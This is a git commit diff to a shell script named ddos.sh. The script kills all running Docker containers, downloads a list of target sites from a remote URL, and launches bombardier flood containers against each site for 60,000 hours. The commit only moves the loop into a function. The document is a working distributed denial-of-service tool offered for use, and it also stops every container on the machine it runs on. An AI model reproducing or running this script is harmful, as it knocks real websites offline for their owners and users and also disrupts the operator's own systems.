41fe47da620480415c6c232647288db9923f9826
koterion <koterion317@gmail.com>
2022-02-27 20:10:11 +0200

    Update to function

--- ddos.sh
+++ ddos.sh
@@ -11,18 +11,21 @@ amount=300
 docker kill $(docker ps -q)
 curl --silent $TARGETS_URL --output targets.txt
 
-echo -e "Number of containers: $amount"
+# shellcheck disable=SC2120
+function start {
+  echo -e "Number of containers: $amount"
 
-while read -r site_url; do
-    if [ ! -z $site_url ]; then
-        echo -e "Site: $site_url"
-        if [ -n "$1" ]; then
-            docker run --platform linux/amd64 -d  alpine/bombardier -c $amount -d 60000h -l $site_url
-        else
-            docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $site_url
-        fi
-    fi
-done < targets.txt
+  while read -r site_url; do
+      if [ ! -z $site_url ]; then
+          echo -e "Site: $site_url"
+          if [ -n "$1" ]; then
+              docker run --platform linux/amd64 -d  alpine/bombardier -c $amount -d 60000h -l $site_url
+          else
+              docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $site_url
+          fi
+      fi
+  done < targets.txt
+}
 
 while test -n "$1"; do
   case "$1" in
@@ -38,3 +41,5 @@ while test -n "$1"; do
   esac
   shift
 done
+
+start
